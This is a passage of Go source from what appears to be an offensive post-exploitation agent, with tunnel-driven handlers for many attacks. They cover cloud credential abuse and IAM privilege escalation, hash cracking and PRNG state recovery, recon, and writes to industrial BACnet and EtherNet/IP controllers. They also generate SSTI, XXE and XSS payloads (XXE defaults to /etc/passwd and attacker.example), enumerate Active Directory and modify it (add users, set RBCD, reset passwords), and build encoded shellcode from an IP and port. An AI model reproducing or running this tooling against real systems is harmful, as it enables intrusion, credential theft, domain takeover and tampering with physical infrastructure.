func runCloud(conn net.Conn, sess *crypto.Session, c proto.CloudStart) {
	send := func(stage, msg, detail string, ok, done bool) {
		sendTunnelAck(conn, sess, proto.TypeCloudData, proto.CloudData{
			SessionID: c.SessionID,
			Stage:     stage,
			Message:   msg,
			Detail:    detail,
			OK:        ok,
			Done:      done,
		})
	}

	switch c.Action {
	case "probe":
		opts := cloudgo.IMDSOptions{}
		var results []cloudgo.ProbeResult
		switch c.Cloud {
		case "aws":
			results = cloudgo.ProbeAWS(opts)
		case "gcp":
			results = cloudgo.ProbeGCP(opts)
		case "azure":
			results = cloudgo.ProbeAzure(opts)
		default:
			send("error", "cloud must be aws|gcp|azure", "", false, true)
			return
		}
		for _, r := range results {
			ok := r.OK
			det := r.Body
			if len(det) > 800 {
				det = det[:800]
			}
			if r.Error != "" {
				det = r.Error
			}
			send("probe", r.URL, det, ok, false)
		}

	case "chain":
		name, results := cloudgo.ProbeChain(cloudgo.IMDSOptions{})
		if name == "" {
			send("probe", "no cloud IMDS reachable", "", false, false)
			return
		}
		send("probe", "live cloud: "+name, "", true, false)
		for _, r := range results {
			if r.OK {
				det := r.Body
				if len(det) > 800 {
					det = det[:800]
				}
				send("probe", r.URL, det, true, false)
			}
		}

	case "identity":
		key := cloudgo.AWSKey{
			AccessKeyID:     c.AccessKeyID,
			SecretAccessKey: c.SecretAccessKey,
			SessionToken:    c.SessionToken,
			Region:          c.Region,
		}
		id, err := cloudgo.GetCallerIdentity(key)
		if err != nil {
			send("identity", "sts error", err.Error(), false, false)
			return
		}
		send("identity", "identity", fmt.Sprintf("account=%s arn=%s userid=%s", id.Account, id.Arn, id.UserID), true, false)

	case "users":
		key := cloudgo.AWSKey{AccessKeyID: c.AccessKeyID, SecretAccessKey: c.SecretAccessKey, SessionToken: c.SessionToken, Region: c.Region}
		users, err := cloudgo.ListUsers(key)
		if err != nil {
			send("iam", "list-users error", err.Error(), false, false)
			return
		}
		for _, u := range users {
			send("iam", "user", u.UserName+" "+u.Arn, true, false)
		}

	case "roles":
		key := cloudgo.AWSKey{AccessKeyID: c.AccessKeyID, SecretAccessKey: c.SecretAccessKey, SessionToken: c.SessionToken, Region: c.Region}
		roles, err := cloudgo.ListRoles(key)
		if err != nil {
			send("iam", "list-roles error", err.Error(), false, false)
			return
		}
		for _, r := range roles {
			send("iam", "role", r.RoleName+" "+r.Arn, true, false)
		}

	case "simulate":
		key := cloudgo.AWSKey{AccessKeyID: c.AccessKeyID, SecretAccessKey: c.SecretAccessKey, SessionToken: c.SessionToken, Region: c.Region}
		actions := c.Actions
		if len(actions) == 0 {
			actions = cloudgo.ProbeActions
		}
		res, err := cloudgo.SimulatePrincipalPolicy(key, c.PolicySourceArn, actions)
		if err != nil {
			send("simulate", "simulate error", err.Error(), false, false)
			return
		}
		allowed := 0
		for _, r := range res {
			if r.Decision == "allowed" {
				allowed++
				send("simulate", "ALLOW", r.Action, true, false)
			}
		}
		send("simulate", fmt.Sprintf("%d/%d allowed", allowed, len(res)), "", true, false)

	case "driver":
		key := cloudgo.AWSKey{AccessKeyID: c.AccessKeyID, SecretAccessKey: c.SecretAccessKey, SessionToken: c.SessionToken, Region: c.Region}
		summary, err := cloudgo.ApplyDriver(key, c.Driver, cloudgo.DriverOptions{
			TargetUser:   c.TargetUser,
			TargetGroup:  c.TargetGroup,
			PolicyARN:    c.PolicyARN,
			VersionID:    c.VersionID,
			RoleARN:      c.RoleARN,
			SessionName:  c.SessionName,
			Password:     c.Password,
			PolicyName:   c.PolicyName,
			DurationSecs: c.DurationSecs,
		})
		if err != nil {
			send("driver", "driver error", err.Error(), false, false)
			return
		}
		send("driver", "ok", summary, true, false)

	default:
		send("error", "unknown cloud action: "+c.Action, "", false, true)
		return
	}
	send("done", "", "", true, true)
}

// runCryptoOp drives one cryptogo operation on the agent. Streams results
// as CryptoOpData messages. Called via proto.TypeCryptoOpStart.
func runCryptoOp(conn net.Conn, sess *crypto.Session, c proto.CryptoOpStart) {
	send := func(stage, msg, detail string, ok, done bool) {
		sendTunnelAck(conn, sess, proto.TypeCryptoOpData, proto.CryptoOpData{
			SessionID: c.SessionID,
			Stage:     stage,
			Message:   msg,
			Detail:    detail,
			OK:        ok,
			Done:      done,
		})
	}

	switch c.Op {
	case "derive":
		priv := new(big.Int)
		if _, ok := priv.SetString(c.PrivHex, 16); !ok {
			send("error", "bad priv_hex", "", false, true)
			return
		}
		p, w, e, err := cryptogo.Addresses(priv)
		if err != nil {
			send("error", "derive", err.Error(), false, true)
			return
		}
		send("result", "btc-p2pkh", p, true, false)
		send("result", "btc-p2wpkh", w, true, false)
		send("result", "eth", e, true, false)

	case "brainwallet":
		priv := cryptogo.BrainwalletPriv(c.Passphrase)
		p, w, e, err := cryptogo.Addresses(priv)
		if err != nil {
			send("error", "brainwallet", err.Error(), false, true)
			return
		}
		send("result", "priv_hex", cryptogo.PrivHex(priv), true, false)
		send("result", "btc-p2pkh", p, true, false)
		send("result", "btc-p2wpkh", w, true, false)
		send("result", "eth", e, true, false)

	case "hash_id":
		matches := cryptogo.IdentifyHash(c.TargetHash)
		if len(matches) == 0 {
			send("result", "no signature match", "", false, false)
		} else {
			send("result", "matches", fmt.Sprintf("%v", matches), true, false)
		}

	case "hash_crack":
		onProg := func(n int64) {
			send("progress", fmt.Sprintf("%d tried", n), "", true, false)
		}
		res, err := cryptogo.CrackHash(c.Algo, c.TargetHash, c.Wordlist, onProg)
		if err != nil {
			send("error", "crack", err.Error(), false, true)
			return
		}
		if res.Found {
			send("result", "FOUND", fmt.Sprintf("word=%s tried=%d", res.Word, res.Tried), true, false)
		} else {
			send("result", "not found", fmt.Sprintf("tried=%d", res.Tried), false, false)
		}

	case "java_recover":
		st, err := cryptogo.JavaRecoverFromTwoInts(c.JavaA, c.JavaB)
		if err != nil {
			send("error", "java recover", err.Error(), false, true)
			return
		}
		send("result", "state", fmt.Sprintf("0x%x", st), true, false)
		n := c.JavaN
		if n <= 0 {
			n = 10
		}
		pred := cryptogo.JavaPredict(st, n)
		send("result", "next ints", fmt.Sprintf("%v", pred), true, false)

	case "win_brute":
		lo := c.WinLo
		hi := c.WinHi
		if hi == 0 {
			hi = 1 << 24
		}
		cands := cryptogo.WinCRTSeedCandidates(c.WinFirst, lo, hi)
		send("result", "candidates", fmt.Sprintf("%v", cands), len(cands) > 0, false)

	case "mt_recover":
		if len(c.MTObs) < 624 {
			send("error", "mt recover", fmt.Sprintf("need 624 observations, got %d", len(c.MTObs)), false, true)
			return
		}
		st, err := cryptogo.MTUntemperAll(c.MTObs)
		if err != nil {
			send("error", "mt recover", err.Error(), false, true)
			return
		}
		n := c.MTN
		if n <= 0 {
			n = 10
		}
		pred := make([]uint32, 0, n)
		for i := 0; i < n; i++ {
			pred = append(pred, st.Next())
		}
		send("result", "next outputs", fmt.Sprintf("%v", pred), true, false)

	default:
		send("error", "unknown op: "+c.Op, "", false, true)
		return
	}
	send("done", "", "", true, true)
}

// runSocial drives a social-recon operation on the agent. Called via
// proto.TypeSocialStart.
func runSocial(conn net.Conn, sess *crypto.Session, s proto.SocialStart) {
	send := func(stage, msg, detail string, ok, done bool) {
		sendTunnelAck(conn, sess, proto.TypeSocialData, proto.SocialData{
			SessionID: s.SessionID,
			Stage:     stage,
			Message:   msg,
			Detail:    detail,
			OK:        ok,
			Done:      done,
		})
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	switch s.Action {
	case "username":
		onHit := func(h socialgo.PlatformHit) {
			send("hit", h.Label, h.URL, true, false)
		}
		onMiss := func(label, reason string) {
			// throttle misses — only every 5th
		}
		_, err := socialgo.EnumerateUsername(ctx, socialgo.UsernameOptions{
			User:    s.User,
			Threads: 10,
		}, onHit, onMiss)
		if err != nil {
			send("error", "username", err.Error(), false, true)
			return
		}

	case "gravatar":
		res, err := socialgo.Gravatar(ctx, s.Email, 0)
		if err != nil {
			send("error", "gravatar", err.Error(), false, true)
			return
		}
		det := res.Body
		if len(det) > 2000 {
			det = det[:2000]
		}
		send("result", "hash="+res.Hash+" found="+fmt.Sprint(res.Found), det, res.Found, false)

	case "subdomains":
		onHit := func(h socialgo.SubdomainHit) {
			send("hit", h.Host, h.IP, true, false)
		}
		_, err := socialgo.EnumerateSubdomains(ctx, s.Domain, s.Words, s.Threads, onHit)
		if err != nil {
			send("error", "subdomains", err.Error(), false, true)
			return
		}

	default:
		send("error", "unknown social action: "+s.Action, "", false, true)
		return
	}
	send("done", "", "", true, true)
}

// runIcsBACnet handles BACnet/IP operations: scan (Who-Is broadcast),
// read (ReadProperty), write (WriteProperty).
func runIcsBACnet(ctx context.Context, ic proto.IcsStart, send func(string, string, string, bool, bool)) {
	opts := icsgo.BACnetOptions{Host: ic.Host, Port: ic.Port}
	switch ic.Action {
	case "scan":
		results, err := icsgo.WhoIsScan(opts, 0, 0xFFFF)
		if err != nil {
			send("scan", "bacnet who-is error", err.Error(), false, false)
			return
		}
		for _, d := range results {
			send("scan", fmt.Sprintf("device %d", d.DeviceInstance), d.Addr+" vendor="+fmt.Sprint(d.VendorID), true, false)
		}
		if len(results) == 0 {
			send("scan", "no devices responded", "", false, false)
		}
	case "read":
		raw, err := icsgo.ReadPropertyValue(opts, ic.ObjType, ic.ObjInstance, ic.PropertyID)
		if err != nil {
			send("read", "bacnet read error", err.Error(), false, false)
			return
		}
		// try to decode the ComplexACK payload
		if len(raw) > 6 {
			// strip BVLC(4) + NPDU(2) to get to the APDU
			apdu := raw[6:]
			if dec, err := icsgo.DecodeReadPropertyACK(apdu); err == nil {
				val := icsgo.BACnetFormatValue(dec.Value)
				det := fmt.Sprintf("obj=%s prop=%d type=%s value=%s",
					dec.ObjectID.String(), dec.PropertyID, dec.Value.Type, val)
				send("read", "decoded", det, true, false)
				send("read", "raw", fmt.Sprintf("%x", raw), true, false)
				return
			}
		}
		send("read", "read response (undecoded)", fmt.Sprintf("%x", raw), true, false)
	case "write":
		// RawValue carries the pre-encoded application tag + value
		addr := ic.Host
		_ = addr
		conn, err := icsgo.BACnetWriteRaw(opts, ic.ObjType, ic.ObjInstance, ic.PropertyID, ic.RawValue)
		if err != nil {
			send("write", "bacnet write error", err.Error(), false, false)
			return
		}
		send("write", "ok", fmt.Sprintf("%x", conn), true, false)
	default:
		send("error", "unknown bacnet action: "+ic.Action, "", false, false)
	}
}

// runIcsENIP handles EtherNet/IP operations: identity (ListIdentity),
// read (CIPReadTag), write (CIPWriteTag).
func runIcsENIP(ctx context.Context, ic proto.IcsStart, send func(string, string, string, bool, bool)) {
	opts := icsgo.ENIPOptions{Host: ic.Host, Port: ic.Port}
	switch ic.Action {
	case "scan", "identity":
		ids, err := icsgo.ListIdentity(opts)
		if err != nil {
			send("scan", "enip list-identity error", err.Error(), false, false)
			return
		}
		for _, id := range ids {
			det := fmt.Sprintf("vendor=0x%04x type=0x%04x product=%s", id.VendorID, id.DeviceType, id.ProductName)
			send("scan", "device", det, true, false)
		}
		if len(ids) == 0 {
			send("scan", "no identity response", "", false, false)
		}
	case "read":
		session, conn, err := icsgo.RegisterSession(opts)
		if err != nil {
			send("read", "register session error", err.Error(), false, false)
			return
		}
		defer conn.Close()
		raw, err := icsgo.CIPReadTag(conn, session, ic.Tag, 5*time.Second)
		if err != nil {
			send("read", "cip read error", err.Error(), false, false)
			return
		}
		send("read", "tag="+ic.Tag, fmt.Sprintf("%x", raw), true, false)
	case "write":
		session, conn, err := icsgo.RegisterSession(opts)
		if err != nil {
			send("write", "register session error", err.Error(), false, false)
			return
		}
		defer conn.Close()
		raw, err := icsgo.CIPWriteTag(conn, session, ic.Tag, ic.DataType, ic.RawValue, 5*time.Second)
		if err != nil {
			send("write", "cip write error", err.Error(), false, false)
			return
		}
		send("write", "ok", fmt.Sprintf("%x", raw), true, false)
	default:
		send("error", "unknown enip action: "+ic.Action, "", false, false)
	}
}

// runIcsOPCUA handles OPC-UA discovery operations.
func runIcsOPCUA(ctx context.Context, ic proto.IcsStart, send func(string, string, string, bool, bool)) {
	opts := icsgo.OPCUAOptions{Host: ic.Host, Port: ic.Port}
	switch ic.Action {
	case "scan", "discover", "info":
		res, err := icsgo.Discover(opts)
		if err != nil {
			send("scan", "opcua discover error", err.Error(), false, false)
			return
		}
		send("scan", "endpoint", res.EndpointURL, res.EndpointURL != "", false)
		for _, p := range res.SecurityPolicies {
			send("scan", "policy", p, true, false)
		}
		for _, t := range res.UserTokenTypes {
			send("scan", "user-token", t, true, false)
		}
		send("scan", "raw-response-bytes", fmt.Sprintf("%d", len(res.RawResponse)), true, false)
	default:
		send("error", "unknown opcua action: "+ic.Action, "", false, false)
	}
}

// runWebSSRF drives the webgo SSRF probe sweep on the agent.
func runWebSSRF(conn net.Conn, sess *crypto.Session, ws proto.WebSSRFStart) {
	send := func(r webgo.SSRFResult, done bool) {
		sendTunnelAck(conn, sess, proto.TypeWebSSRFData, proto.WebSSRFData{
			SessionID:  ws.SessionID,
			Probe:      r.Probe,
			URL:        r.URL,
			OK:         r.OK,
			Status:     r.Status,
			BodyLen:    r.BodyLen,
			Body:       r.Body,
			Err:        r.Err,
			DurationMs: r.DurationMs,
			Done:       done,
		})
	}

	probes := make([]webgo.SSRFProbe, 0, len(ws.Probes))
	for _, p := range ws.Probes {
		probes = append(probes, webgo.SSRFProbe{
			Label:   p.Label,
			URL:     p.URL,
			Method:  p.Method,
			Headers: p.Headers,
			Body:    p.Body,
		})
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	client := webgo.DefaultSSRFClient()
	client.ProbeAll(ctx, probes, ws.Threads, func(r webgo.SSRFResult) {
		send(r, false)
	})
	send(webgo.SSRFResult{}, true)
}

// runWebSSTI streams SSTI payloads or fingerprint probes for a given engine.
func runWebSSTI(conn net.Conn, sess *crypto.Session, ws proto.WebSSTIStart) {
	send := func(kind, engine, label, payload, notes string) {
		sendTunnelAck(conn, sess, proto.TypeWebSSTIData, proto.WebSSTIData{
			SessionID: ws.SessionID,
			Engine:    engine,
			Label:     label,
			Payload:   payload,
			Notes:     notes,
			Kind:      kind,
		})
	}

	if ws.ListFPs {
		for _, fp := range webgo.ListSSTIFingerprints() {
			send("fingerprint", string(fp.Engine), fp.Language, fp.Payload, "expect: "+fp.Expected)
		}
		send("done", "", "", "", "")
		return
	}

	cmd := ws.Cmd
	if cmd == "" {
		cmd = "id"
	}

	var engines []webgo.SSTIEngine
	if ws.Engine != "" {
		engines = []webgo.SSTIEngine{webgo.SSTIEngine(ws.Engine)}
	} else {
		engines = []webgo.SSTIEngine{
			webgo.EngineJinja2, webgo.EngineTwig, webgo.EngineFreemarker,
			webgo.EngineVelocity, webgo.EngineSmarty, webgo.EngineMako,
			webgo.EnginePebble, webgo.EngineERB, webgo.EngineTornado,
		}
	}

	for _, e := range engines {
		for _, p := range webgo.ListSSTIForEngine(e) {
			send("payload", string(e), p.Label, webgo.RenderSSTIPayload(p, cmd), p.Notes)
		}
	}
	send("done", "", "", "", "")
}

// runWebXXE streams XXE payloads for the requested kind (or all kinds).
func runWebXXE(conn net.Conn, sess *crypto.Session, wx proto.WebXXEStart) {
	send := func(label, kind, payload, notes, extra string) {
		sendTunnelAck(conn, sess, proto.TypeWebXXEData, proto.WebXXEData{
			SessionID: wx.SessionID,
			Label:     label,
			Kind:      kind,
			Payload:   payload,
			Notes:     notes,
			Extra:     extra,
		})
	}

	opts := webgo.XXEOptions{
		File:     wx.File,
		URL:      wx.URL,
		Attacker: wx.Attacker,
	}
	if opts.File == "" {
		opts.File = "/etc/passwd"
	}
	if opts.URL == "" {
		opts.URL = "http://169.254.169.254/latest/meta-data/"
	}
	if opts.Attacker == "" {
		opts.Attacker = "attacker.example"
	}

	// sweep default file and URL targets
	if wx.Defaults {
		for _, f := range webgo.XXEDefaultFiles {
			o := opts
			o.File = f
			for _, p := range webgo.XXEPayloads {
				if p.Kind != "in-band" {
					continue
				}
				send(p.Label, p.Kind, webgo.RenderXXE(p, o), p.Notes, "file="+f)
			}
		}
		for _, u := range webgo.XXEDefaultSSRFURLs {
			o := opts
			o.URL = u
			for _, p := range webgo.XXEPayloads {
				if p.Kind != "ssrf" {
					continue
				}
				send(p.Label, p.Kind, webgo.RenderXXE(p, o), p.Notes, "url="+u)
			}
		}
		send("done", "done", "", "", "")
		return
	}

	// single-category
	for _, p := range webgo.XXEPayloads {
		if wx.Kind != "" && wx.Kind != "all" && p.Kind != wx.Kind {
			continue
		}
		send(p.Label, p.Kind, webgo.RenderXXE(p, opts), p.Notes, "")
	}
	send("done", "done", "", "", "")
}

// runWebXSS streams XSS payloads for the requested context (or all).
func runWebXSS(conn net.Conn, sess *crypto.Session, wx proto.WebXSSStart) {
	send := func(kind, ctx, label, payload, notes string) {
		sendTunnelAck(conn, sess, proto.TypeWebXSSData, proto.WebXSSData{
			SessionID: wx.SessionID,
			Context:   ctx,
			Label:     label,
			Payload:   payload,
			Notes:     notes,
			Kind:      kind,
		})
	}

	if wx.FPs {
		for _, fp := range webgo.XSSFingerprints {
			send("fingerprint", fp.Framework, fp.Marker, fp.Marker, fp.Meaning)
		}
		send("done", "", "", "", "")
		return
	}

	js := wx.JS
	if js == "" {
		js = "alert(1)"
	}

	for _, p := range webgo.XSSPayloads {
		if wx.Context != "" && wx.Context != "all" && p.Context != wx.Context {
			continue
		}
		send("payload", p.Context, p.Label, webgo.RenderXSSPayload(p, js), p.Notes)
	}
	send("done", "", "", "", "")
}

// runAdEnum runs one LDAP enumeration against the DC.
func runAdEnum(conn net.Conn, sess *crypto.Session, ae proto.AdEnumStart) {
	sendEntry := func(e adgo.LDAPEntry) {
		sendTunnelAck(conn, sess, proto.TypeAdEnumData, proto.AdEnumData{
			SessionID: ae.SessionID,
			Action:    ae.Action,
			DN:        e.DN,
			Attrs:     e.Attrs,
			OK:        true,
		})
	}
	sendMsg := func(msg string, ok, done bool) {
		sendTunnelAck(conn, sess, proto.TypeAdEnumData, proto.AdEnumData{
			SessionID: ae.SessionID,
			Action:    ae.Action,
			Message:   msg,
			OK:        ok,
			Done:      done,
		})
	}

	opts := adgo.LDAPOptions{
		Host:   ae.Host,
		Port:   ae.Port,
		TLS:    ae.UseTLS,
		BindDN: ae.BindDN,
		BindPW: ae.BindPW,
	}
	c, err := adgo.Dial(opts)
	if err != nil {
		sendMsg("dial: "+err.Error(), false, true)
		return
	}
	defer c.Close()
	if err := c.Bind(); err != nil {
		sendMsg("bind: "+err.Error(), false, true)
		return
	}

	base := ae.BaseDN
	if base == "" {
		base, err = adgo.RootDSE(context.Background(), c)
		if err != nil {
			sendMsg("rootdse: "+err.Error(), false, true)
			return
		}
	}
	sendMsg("baseDN="+base, true, false)

	switch ae.Action {
	case "rootdse":
		sendMsg("baseDN="+base, true, false)
	case "domain":
		if e, err := adgo.DomainInfo(base, c); err == nil {
			sendEntry(e)
		} else {
			sendMsg(err.Error(), false, false)
		}
	case "users":
		if entries, err := adgo.EnumerateUsers(base, c); err == nil {
			for _, e := range entries {
				sendEntry(e)
			}
		}
	case "groups":
		if entries, err := adgo.EnumerateGroups(base, c); err == nil {
			for _, e := range entries {
				sendEntry(e)
			}
		}
	case "computers":
		if entries, err := adgo.EnumerateComputers(base, c); err == nil {
			for _, e := range entries {
				sendEntry(e)
			}
		}
	case "gpos":
		if entries, err := adgo.EnumerateGPOs(base, c); err == nil {
			for _, e := range entries {
				sendEntry(e)
			}
		}
	case "trusts":
		if entries, err := adgo.EnumerateTrusts(base, c); err == nil {
			for _, e := range entries {
				sendEntry(e)
			}
		}
	case "asrep":
		if entries, err := adgo.EnumerateASREPRoastable(base, c); err == nil {
			for _, e := range entries {
				sendEntry(e)
			}
		}
	case "kerberoast":
		if entries, err := adgo.EnumerateKerberoastable(base, c); err == nil {
			for _, e := range entries {
				sendEntry(e)
			}
		}
	case "unconstrained":
		if entries, err := adgo.EnumerateUnconstrainedDelegation(base, c); err == nil {
			for _, e := range entries {
				sendEntry(e)
			}
		}
	case "pwdnotreq":
		if entries, err := adgo.EnumeratePasswordNotRequired(base, c); err == nil {
			for _, e := range entries {
				sendEntry(e)
			}
		}
	case "laps":
		if entries, err := adgo.EnumerateLAPS(base, c); err == nil {
			for _, e := range entries {
				sendEntry(e)
			}
		}
	case "adcs":
		cas, tpls, _ := adgo.EnumerateADCS(base, c)
		for _, e := range cas {
			sendEntry(e)
		}
		for _, e := range tpls {
			sendEntry(e)
		}
	case "write":
		runAdWrite(c, ae, sendMsg)
	default:
		sendMsg("unknown ad action: "+ae.Action, false, true)
		return
	}
	sendMsg("", true, true)
}

// runAdWrite handles the LDAP write actions. Every driver here requires a
// privileged bind — plaintext LDAP rejects unicodePwd writes; use LDAPS.
func runAdWrite(c *adgo.LDAPConn, ae proto.AdEnumStart, sendMsg func(string, bool, bool)) {
	var err error
	switch ae.WriteDriver {
	case "add_user":
		err = c.AddUser(ae.TargetDN, ae.AttrName, ae.Password, "")
		// attr_name reused as samAccountName
	case "add_to_group":
		err = c.AddUserToGroup(ae.GroupDN, ae.TargetDN)
	case "remove_from_group":
		err = c.RemoveUserFromGroup(ae.GroupDN, ae.TargetDN)
	case "set_attr":
		err = c.SetAttribute(ae.TargetDN, ae.AttrName, ae.AttrValue)
	case "del_attr":
		err = c.DeleteAttribute(ae.TargetDN, ae.AttrName)
	case "add_spn":
		err = c.AddSPN(ae.TargetDN, ae.SPN)
	case "remove_spn":
		err = c.RemoveSPN(ae.TargetDN, ae.SPN)
	case "set_uac":
		err = c.SetUserAccountControl(ae.TargetDN, ae.UACValue)
	case "add_uac":
		err = c.AddUACFlag(ae.TargetDN, ae.UACCurrent, ae.UACValue)
	case "set_dontpreauth":
		err = c.SetDontReqPreauth(ae.TargetDN, ae.UACCurrent)
	case "clear_dontpreauth":
		err = c.ClearDontReqPreauth(ae.TargetDN, ae.UACCurrent)
	case "set_primary_group":
		err = c.SetPrimaryGroupID(ae.TargetDN, ae.PrimaryGID)
	case "modify_pw":
		err = c.ModifyPassword(ae.TargetDN, ae.Password)
	case "set_rbcd":
		err = c.SetAllowedToActOnBehalf(ae.TargetDN, ae.EncodedSD)
	default:
		sendMsg("unknown write driver: "+ae.WriteDriver, false, true)
		return
	}
	if err != nil {
		sendMsg("write error: "+err.Error(), false, true)
		return
	}
	sendMsg("ok: "+ae.WriteDriver, true, false)
}

// runShellcode generates a shellcode stub, optionally encoded.
func runShellcode(conn net.Conn, sess *crypto.Session, sc proto.ShellcodeStart) {
	send := func(d proto.ShellcodeData) {
		sendTunnelAck(conn, sess, proto.TypeShellcodeData, d)
	}

	opts := shellcode.BuildOptions{
		Arch:        shellcode.Arch(sc.Arch),
		Kind:        sc.Kind,
		IP:          sc.IP,
		Port:        sc.Port,
		WinExecAddr: sc.WinExec,
	}
	stub, err := shellcode.Build(opts)
	if err != nil {
		send(proto.ShellcodeData{SessionID: sc.SessionID, Notes: "build error: " + err.Error(), Done: true})
		return
	}

	d := proto.ShellcodeData{
		SessionID: sc.SessionID,
		Label:     stub.Label,
		Raw:       shellcode.Hex(stub.Bytes),
		Size:      len(stub.Bytes),
		Notes:     stub.Notes,
		CArray:    shellcode.CArray("sc", stub.Bytes),
	}

	// optional encoding
	switch sc.Encode {
	case "", "none":
		d.Encoded = d.Raw
	case "uuid":
		d.Encoded = strings.Join(shellcode.UUIDStrings(stub.Bytes), "\n")
		d.EncodeKey = "uuid-pack"
	case "ipv4":
		d.Encoded = strings.Join(shellcode.IPv4Strings(stub.Bytes), "\n")
		d.EncodeKey = "ipv4-pack"
	default:
		enc, _, err := shellcode.Encode(sc.Encode, sc.Key, stub.Bytes)
		if err != nil {
			send(proto.ShellcodeData{SessionID: sc.SessionID, Notes: "encode error: " + err.Error(), Done: true})
			return
		}
		// base64 output is text, everything else is hex
		if sc.Encode == "base64" || sc.Encode == "b64" {
			d.Encoded = string(enc)
		} else {
			d.Encoded = shellcode.Hex(enc)
		}
		_, encErr := shellcode.EncoderByName(sc.Encode, sc.Key)
		if encErr != nil {
			send(proto.ShellcodeData{SessionID: sc.SessionID, Notes: "encoder: " + err.Error(), Done: true})
			return
		}
		// the key text is embedded above via the encoder's Key() during encode
		// (shellcode.Encode drops it) — re-fetch by calling the encoder.
		e2, _ := shellcode.EncoderByName(sc.Encode, sc.Key)
		d.EncodeKey = e2.Key()
	}

	send(d)
	send(proto.ShellcodeData{SessionID: sc.SessionID, Done: true})
}
